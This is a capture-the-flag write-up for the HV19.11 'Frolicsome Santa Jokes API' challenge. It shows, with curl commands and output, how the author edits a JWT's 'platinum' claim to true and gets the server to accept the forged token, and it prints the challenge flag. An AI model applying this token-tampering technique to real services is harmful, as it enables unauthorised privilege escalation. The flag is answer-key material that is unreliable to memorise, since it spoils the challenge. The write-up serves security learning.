# HV19.11 Frolicsome Santa Jokes API

_The elves created an API where you get random jokes about santa._

_Go and try it here: http://whale.hacking-lab.com:10101_

---

API docs: [FSJA-API-Description.html](FSJA-API-Description.html)

This was an easy one for me. I'm familiar with [JWT tokens](https://en.wikipedia.org/wiki/JSON_Web_Token)
and I know they can be easily manipulated if not encrypted.

1) Register a new user
    ```
    $ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/register --data '{"username":"vernjan", "password": "helloworld"}'
    {"message":"User created","code":201} 
    ```

2) Log in and obtain JWT token
    ```
    $ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username":"vernjan", "password": "helloworld"}'
    {"message":"Token generated","code":201,"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidmVybmphbiIsInBsYXRpbnVtIjpmYWxzZX0sImV4cCI6MTU3NjAyMzc0NS42NTcwMDAwMDB9.17DcbmK5Gushb5Pa2dBTqwbTWecDN6i5NBubfdSCOZ0"}
    ```

3) Decode JWT token online using https://jwt.io/
    ```
    {
      "user": {
        "username": "vernjan",
        "platinum": false
      },
      "exp": 1576023745.657
    }
    ```
   Ok, what's `platinum`.. Let's try to change it to `true`
   
   ![](jwt-io.png)
   
4) Copy encoded token and use it for getting a joke
    ```
    $ curl -X GET "http://whale.hacking-lab.com:10101/fsja/random?token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidmVybmphbiIsInBsYXRpbnVtIjp0cnVlfSwiZXhwIjoxNTc2MDIzNzQ1LjY1N30.Iu4cpEbDe0C534uM5jf4a8VJatMhYE_LpZbD3yqMsIE"
    {"joke":"Congratulation! Sometimes bugs are rather stupid. But that's how it happens, sometimes. Doing all the crypto stuff right and forgetting the trivial stuff like input validation, Hohoho! Here's your flag: HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}","author":"Santa","platinum":true}
    ```
   
The flag is `HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}`